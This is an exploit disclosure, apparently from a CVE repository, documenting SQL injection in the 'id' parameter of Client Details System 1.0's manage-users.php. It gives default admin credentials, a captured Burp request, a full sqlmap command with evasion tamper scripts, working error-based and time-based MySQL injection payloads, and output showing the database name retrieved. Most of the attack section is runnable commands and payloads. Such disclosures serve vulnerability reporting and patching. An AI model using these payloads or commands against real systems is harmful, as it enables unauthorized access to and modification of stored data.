# Client_Details_System-SQL_Injection_4
+ **Exploit Title:** Client_Details_System-SQL_Injection_4
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
Client Details System 1.0 allows SQL Injection via parameter 'id' in "/clientdetails/admin/manage-users.php?id=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Fill User Id and Password with `admin`:`client123` and log in.
+ Manage Users: "http://localhost/clientdetails/admin/manage-users.php"
+ Then click Delete button for any user: "http://localhost/clientdetails/admin/manage-users.php?id=1"
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
GET /clientdetails/admin/manage-users.php?id=1 HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=p5mgq2eci66sik6s94eakcjub9
Referer: http://localhost/clientdetails/admin/manage-users.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p id --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(3346,CONCAT(0x5c,0x716b6a7a71,(SELECT (ELT(3346=3346,1))),0x7171707171))-- gsCH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9169 FROM (SELECT(SLEEP(5)))gCdu)-- FiYL
---
[17:48:57] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[17:48:57] [INFO] fetching current database
[17:48:57] [INFO] retrieved: 'loginsystem'
current database: 'loginsystem'
```

+ current database: `loginsystem`
![4](https://github.com/h4md153v63n/CVEs/assets/5091265/2db1ab40-749f-4e0c-943b-fd362f079d0b)
